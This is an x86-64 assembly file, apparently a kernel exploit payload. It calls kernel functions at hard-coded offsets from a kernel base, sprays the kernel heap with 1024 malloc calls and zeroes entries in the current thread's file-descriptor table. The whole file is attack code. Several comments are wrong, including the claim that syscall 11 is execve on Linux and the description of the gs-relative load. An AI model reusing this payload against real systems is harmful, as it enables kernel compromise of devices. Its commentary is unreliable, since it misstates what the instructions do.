use64

; The "entry" label marks the entry point of the program.
entry:
    push rsi ; save the value of RSI register on the stack, wich will be restored later
    push rdi ; save the value of RDI register on the stack, wich will be restored later
    mov rsi, rsp; The RSP register points to the top of the stack, so this instruction copies the value of RSP to RSI.
    lea rdi, [rel kernel_entry]    ; Load the address of the "kernel_entry" label into RDI.
    mov eax, 11; Set the value of EAX to 11, which is the syscall number for the "execve" system call on Linux.

    ; This instruction invokes the "execve" system call with RDI as the first argument
    ; (the address of the program to execute) and RSI as the second argument (the
    ; address of the argument list).
    syscall

    pop rdi;restore the value of RDI register from the stack
    pop rsi;restore the value of RSI register from the stack
    ret; This instruction returns control to the caller.

; The "kernel_entry" label marks the start of a new code block.
kernel_entry:              
    mov rsi, [rsi+8]        ; Load the value at the address pointed to by RSI+8 into RSI.
    push qword [rsi]        ;  push the values at the addresses 
    push qword [rsi+8]      ; pointed to by RSI and RSI+8 onto the stack
    mov rcx, 1024           ; Set the value of RCX to 1024.

; The ".malloc_loop" label marks the start of a loop.
.malloc_loop:
push rcx                ; This instruction pushes the value of RCX onto the stack.
mov rax, [rsp+8]        ; Load the value of the kernel base (the second argument on the stack) into RAX.
mov edi, 0xf8           ; Set the value of EDI to 0xf8.
lea rsi, [rax+0x1540eb0]; Load the address of the M_TEMP symbol (presumably defined elsewhere) into RSI.
mov edx, 2              ; Set the value of EDX to 2.
add rax, 0xd7a0         ; Add the value of 0xd7a0 to RAX and stores the result back in RAX.
call rax                ; call the function at the address stored in RAX with arguments RSI, RDI, and RDX. The return value will be stored in RAX.              
pop rcx                 ; This instruction pops the value of RCX off the stack.
loop .malloc_loop       ; decrement the value of RCX and jumps to the ".malloc_loop" label if the result is not zero.
pop rdi                 ; pop the value of RDI off the stack
pop rsi                 ; pop the value of RSI off the stack
test rsi, rsi           ; Perform a bitwise AND operation between RSI and RSI, and sets the zero flag in the EFLAGS register if the result is zero.
jz .skip_closeup        ;Jump to the ".skip_closeup" label if the zero flag is set.
mov rax, [gs:0]         ; Load the value of the "gs" segment register into RAX.
mov rax, [rax+8]        ; Load the value at the address pointed to by RAX+8 into RAX.
mov rax, [rax+0x48]     ; Load the value at the address pointed to by RAX+0x48 into RAX.
mov rdx, [rax]          ; Load the value at the address pointed to by RAX into RDX.
mov rcx, 512            ; Set the value of RCX to 512.

.closeup_loop:
lodsd
mov qword [rdx+8*rax], 0
loop .closeup_loop
.skip_closeup:
xor eax, eax
ret
align 8
